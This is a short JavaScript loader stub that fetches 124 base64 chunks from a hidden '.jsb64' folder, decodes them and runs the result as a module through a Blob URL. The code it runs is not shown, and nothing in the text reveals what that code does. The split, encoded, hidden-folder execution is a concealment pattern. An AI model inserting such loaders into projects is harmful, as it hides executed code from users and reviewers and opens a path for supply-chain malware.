const __FMT_PARTS = 124;
const __FMT_BASE = new URL("./.jsb64/", import.meta.url);
const __FMT_B64 = await Promise.all(
  Array.from({ length: __FMT_PARTS }, (_, i) =>
    fetch(new URL(String(i).padStart(2, "0") + ".b64", __FMT_BASE)).then((r) => {
      if (!r.ok) throw new Error("Failed to load JS b64 part " + i);
      return r.text();
    })
  )
);
const __FMT_BIN = Uint8Array.from(atob(__FMT_B64.join("").replace(/\s+/g,"")), c => c.charCodeAt(0));
await import(URL.createObjectURL(new Blob([__FMT_BIN], { type: "text/javascript" })));
